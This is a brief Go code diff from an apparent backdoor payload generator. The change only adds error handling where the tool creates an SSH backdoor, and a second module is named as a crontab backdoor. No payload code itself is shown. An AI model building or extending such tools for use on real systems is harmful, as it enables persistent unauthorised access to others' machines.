@@ -39,7 +39,11 @@ func (g *Generator) Generate(moduleID int) error {
 	// 根据模块类型生成payload
 	switch moduleID {
 	case 1:
-		return ssh.NewSSHBackdoor().GeneratePayload(outDir)
+		backdoor, err := ssh.NewSSHBackdoor()
+		if err != nil {
+			return fmt.Errorf("failed to create SSH backdoor: %v", err)
+		}
+		return backdoor.GeneratePayload(outDir)
 	case 2:
 		return crontab.NewCrontabBackdoor().GeneratePayload(outDir)
 	default:
